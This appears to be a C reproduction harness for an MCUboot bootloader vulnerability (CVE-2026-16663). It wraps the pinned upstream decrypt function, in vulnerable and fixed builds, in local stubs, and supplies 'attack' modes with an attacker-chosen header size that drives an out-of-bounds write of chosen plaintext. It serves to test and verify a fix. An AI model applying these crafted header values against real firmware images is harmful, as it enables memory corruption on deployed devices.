/*
 * MCUboot CVE-2026-16663 harness.
 *
 * The function decrypt_region_inplace() is pinned verbatim from upstream
 * (see the two .inc files). Everything else here is a local stand-in:
 * structs, flash_area_read/erase/write, boot_enc_decrypt (the store sink),
 * bootutil_wipe_memory and the caller values. No MCUboot build, no serial
 * wire, no real AES key, no bootloader process.
 */
#include <assert.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BOOT_EFLASH 3
#define BOOT_EBADIMAGE 7
#define SECT_SZ 4096u

struct enc_key_data { uint8_t key[32]; };
struct flash_area { uint32_t fa_off; uint32_t fa_size; };
struct image_header {
    uint16_t ih_hdr_size;   /* verbatim type from bootutil/image.h */
    uint32_t ih_flags;
    uint32_t ih_tlv_off;    /* stand-in for BOOT_TLV_OFF(hdr) */
};

#define IS_ENCRYPTED(hdr) (((hdr)->ih_flags & 1u) != 0)
#define BOOT_TLV_OFF(hdr) ((hdr)->ih_tlv_off)
#define MCUBOOT_WATCHDOG_FEED() do { } while (0)

static uint8_t g_image[32768];
static uint8_t g_plain[16];
static uint8_t *g_written;
static uint8_t *g_buf;
static uint32_t g_write_off;
static uint32_t g_write_len;

static void bootutil_wipe_memory(void *p, size_t n) { memset(p, 0, n); }

static int flash_area_read(const struct flash_area *fa, uint32_t off,
                           void *dst, size_t len)
{
    (void)fa;
    if ((size_t)off + len > sizeof g_image) { return -1; }
    g_buf = dst;
    memcpy(dst, g_image + off, len);
    return 0;
}

static int boot_erase_region(const struct flash_area *fa, uint32_t off,
                             uint32_t len, bool skip)
{
    (void)fa; (void)off; (void)len; (void)skip;
    return 0;
}

static int flash_area_write(const struct flash_area *fa, uint32_t off,
                            const void *src, uint32_t len)
{
    (void)fa; (void)off; (void)src; (void)len;
    return 0;
}

/* Stand-in for the real decryptor: writes chosen plaintext bytes into the
 * caller-provided destination. The destination is computed by the pinned
 * function; this stub never checks its bounds. */
static int boot_enc_decrypt(struct enc_key_data *enc, uint32_t off,
                            uint32_t len, size_t blk_off, uint8_t *dst)
{
    uint32_t i;
    (void)enc;
    g_write_off = off;
    g_write_len = len;
    g_written = dst;
    for (i = 0; i < len; i++) {
        dst[i] = g_plain[(i + blk_off) & 0xf];
    }
    return 0;
}

#ifdef FIXED_BUILD
#include "decrypt_region_inplace_fixed.inc"
#else
#include "decrypt_region_inplace_vuln.inc"
#endif

int main(int argc, char **argv)
{
    const char *mode = (argc > 1) ? argv[1] : "attack";
    const char *chosen = (argc > 2) ? argv[2] : "MISHE-MCUBOOT!!";
    uint32_t off = SECT_SZ;             /* second sector by default */
    uint16_t hdr_size = 6144;           /* attacker-controlled ih_hdr_size */
    uint32_t tlv_off = 0xffffffffu;     /* keep the TLV clamp inactive */
    struct image_header hdr;
    struct flash_area fa;
    struct enc_key_data enc;
    uint8_t dump[16];
    int rc;
    size_t i;

    if (strcmp(mode, "safe") == 0) {
        off = SECT_SZ; hdr_size = 0; tlv_off = 0xffffffffu;
    } else if (strcmp(mode, "attack2") == 0) {
        off = 0; hdr_size = 1024; tlv_off = 3000;
    } else if (strcmp(mode, "edge") == 0) {
        off = SECT_SZ; hdr_size = 4104; tlv_off = 0xffffffffu;
    }

    memset(g_plain, 0, sizeof g_plain);
    for (i = 0; chosen[i] && i < sizeof g_plain; i++) {
        g_plain[i] = (uint8_t)chosen[i];
    }

    hdr.ih_hdr_size = hdr_size;
    hdr.ih_flags = 1;                   /* IS_ENCRYPTED */
    hdr.ih_tlv_off = tlv_off;
    fa.fa_off = 0;
    fa.fa_size = sizeof g_image;
    memset(&enc, 0, sizeof enc);

    rc = decrypt_region_inplace(&enc, &fa, &hdr, off, SECT_SZ);

#ifndef ASAN_BUILD
    /* Plain build only: read the bytes actually stored through the pinned
     * function's computed destination before doing any printing. */
    memcpy(dump, g_written, sizeof dump);
    printf("rc=%d mode=%s off=%u hdr_size=%u tlv_off=%u "
           "decrypt_off=%u decrypt_len=%u dst=buf+%ld "
           "first16=", rc, mode, off, hdr_size, tlv_off,
           g_write_off, g_write_len,
           (long)(g_written - g_buf));
    for (i = 0; i < sizeof dump; i++) { printf("%02x", dump[i]); }
    printf("\n");
#else
    printf("rc=%d mode=%s off=%u hdr_size=%u tlv_off=%u "
           "decrypt_off=%u decrypt_len=%u\n",
           rc, mode, off, hdr_size, tlv_off, g_write_off, g_write_len);
#endif
    return rc == 0 ? 0 : 2;
}
